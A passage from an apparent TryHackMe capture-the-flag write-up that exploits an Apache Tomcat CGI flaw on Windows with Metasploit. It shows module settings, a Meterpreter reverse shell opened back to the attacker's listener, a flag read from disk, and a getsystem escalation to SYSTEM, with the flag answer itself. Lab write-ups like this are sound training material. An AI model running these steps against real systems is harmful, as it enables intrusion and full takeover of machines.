   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The URI path to CGI script
   VHOST                       no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.16.57.163    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Apache Tomcat 9.0 or prior for Windows
```

We need to set the `RHOST` to the THM box, the `LHOST` to my Try Hack Me IP address and the `TARGETURI` to `/cgi-bin/elfwhacker.bat`.

```
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set RHOSTS 10.10.143.182
RHOSTS => 10.10.143.182
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set LHOSTS 10.6.23.34
LHOST => 10.6.23.34
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > set TARGETURI /cgi-bin/elfwhacker.bat
TARGETURI => /cgi-bin/elfwhacker.bat
```

Then, I can run the exploit to get a shell!

```
msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > run

[*] Started reverse TCP handler on 10.6.23.34:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Command Stager progress -   6.95% done (6999/100668 bytes)
[*] Command Stager progress -  13.91% done (13998/100668 bytes)
[*] Command Stager progress -  20.86% done (20997/100668 bytes)
[*] Command Stager progress -  27.81% done (27996/100668 bytes)
[*] Command Stager progress -  34.76% done (34995/100668 bytes)
[*] Command Stager progress -  41.72% done (41994/100668 bytes)
[*] Command Stager progress -  48.67% done (48993/100668 bytes)
[*] Command Stager progress -  55.62% done (55992/100668 bytes)
[*] Command Stager progress -  62.57% done (62991/100668 bytes)
[*] Command Stager progress -  69.53% done (69990/100668 bytes)
[*] Command Stager progress -  76.48% done (76989/100668 bytes)
[*] Command Stager progress -  83.43% done (83988/100668 bytes)
[*] Command Stager progress -  90.38% done (90987/100668 bytes)
[*] Command Stager progress -  97.34% done (97986/100668 bytes)
[*] Command Stager progress - 100.02% done (100692/100668 bytes)
[*] Sending stage (175174 bytes) to 10.10.143.182
[*] Meterpreter session 1 opened (10.6.23.34:4444 -> 10.10.143.182:49907) at 2020-12-12 15:39:53 -0500

meterpreter > shell
Process 3992 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>whoami
whoami
tbfc-web-01\elfmcskidy

```

### Getting the flag

Now that we have a Windows Command Prompt, the real challenge has begun: actually using it LOL (ok, you see, i'm much more comfortable in a UNIX terminal...)

We use `dir` and `type` instead of `ls` and `cat` respectively.

```
C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 4277-4242

 Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin

12/12/2020  20:39    <DIR>          .
12/12/2020  20:39    <DIR>          ..
19/11/2020  21:39               825 elfwhacker.bat
19/11/2020  22:06                27 flag1.txt
12/12/2020  20:39            73,802 vzlXv.exe
               3 File(s)         74,654 bytes
               2 Dir(s)  13,497,925,632 bytes free

C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi-bin>type flag1.txt
type flag1.txt
thm{whacking_all_the_elves}
```

And now we have the flag!

Flag: `thm{whacking_all_the_elves}`

### Privilege Escalation

There is an extra challenge! Privilege escalation was actually made very very simple with Metasploit.

```
meterpreter > getuid
Server username: TBFC-WEB-01\elfmcskidy
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

(note: since this is a windows box, `NT AUTHORITY\SYSTEM == root`)

Although, I assume there is another flag2.txt or something on this box, unfortunately, I was not able to find it...